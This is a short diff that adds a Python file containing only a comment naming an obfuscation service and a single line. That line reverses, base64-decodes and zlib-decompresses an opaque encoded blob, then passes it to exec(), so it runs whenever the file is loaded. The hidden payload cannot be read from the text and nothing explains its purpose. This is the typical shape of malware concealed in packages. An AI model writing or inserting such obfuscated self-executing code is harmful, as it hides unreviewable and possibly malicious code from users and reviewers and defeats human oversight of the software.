@@ -1,0 +1,2 @@
+# Python obfuscation by pyobfuscator.com
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==Qfu5mTNg+vtyf+FGHKe80+KTSFsQnRa444JpaggHMuFFuPzEJ8A77khtfHiICLyRdpIFtaiwTKcNHzmLKUuEgmoOJMRdtT50HTq0/qVMHRc6Y2tv9Qn+ytdhLSN8A9S6PWoHp7yhHMPIZhhnjxwxlb7UoRw1iptr+HQqxCFfBZS+8T+fP4dYHoC3434dlTRgGpD7ZEXtVZWJcLHQkkmoIGHEEBVJL0FCq0QUrNYi/p9GfxYAkgKEkz1xJe'))
